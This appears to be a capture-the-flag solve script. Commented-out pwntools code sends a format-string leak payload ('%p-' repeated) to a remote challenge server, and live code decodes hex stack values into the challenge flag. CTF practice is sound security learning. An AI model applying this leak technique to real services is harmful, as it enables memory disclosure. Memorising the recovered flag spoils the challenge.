# from pwn import *
#
# # p = process('./money')
# p = remote('money.sdc.tf', 1337)
#
# p.sendline(b'-1')
# # gdb.attach(p)
# # pause()
# payload = b'%p-' * 20
# p.sendline(payload)
#
# p.interactive()
import binascii

s1 = binascii.unhexlify("34647b6674636473").decode('utf-8')
s2 = binascii.unhexlify("665f7530795f6e6d").decode('utf-8')
s3 = binascii.unhexlify("435f345f446e7530").decode('utf-8')
s4 = binascii.unhexlify("304d345f597a3472").decode('utf-8')
s5 = binascii.unhexlify("4d5f66305f374e75").decode('utf-8')
s6 = binascii.unhexlify("79336e30").decode('utf-8')

print(s1[::-1], end='')
print(s2[::-1], end='')
print(s3[::-1], end='')
print(s4[::-1], end='')
print(s5[::-1], end='')
print(s6[::-1], end='')
